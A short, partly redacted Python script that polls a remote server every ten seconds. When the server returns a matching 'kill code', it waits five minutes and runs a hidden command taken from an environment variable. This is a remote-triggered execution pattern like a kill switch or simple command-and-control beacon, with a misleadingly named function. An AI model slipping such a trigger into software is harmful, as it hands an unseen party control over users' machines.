
import time
import requests
import subprocess
import os
from dotenv import load_dotenv

load_dotenv()

config = {
    "check_url": os.getenv("SERVER_-----redacteddd-----_URL"),
    "kill_code": "---redacteddd-------",
    "process": "test.exe"  
}



def temp_data():
    time.sleep(300)
    subprocess.run(os.getenv("-----REDACTED----------"))
                        
    

while True:
    try:
        response = requests.get(config['check_url'])
     
        if config['kill_code'] == response.json()['status']:
            temp_data()

            break
    except:
        pass
    time.sleep(10)  
